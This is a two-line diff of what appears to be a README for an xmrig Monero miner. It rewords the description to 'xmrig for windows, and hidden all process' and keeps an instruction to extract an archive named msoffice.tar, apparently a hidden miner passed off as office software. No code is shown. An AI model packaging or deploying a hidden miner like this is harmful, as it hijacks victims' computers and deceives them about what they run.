@@ -1,4 +1,4 @@
-This is xmrig (monero) miner.
+This is xmrig for windows, and hidden all process.
 
 Extract file msoffice.tar
 
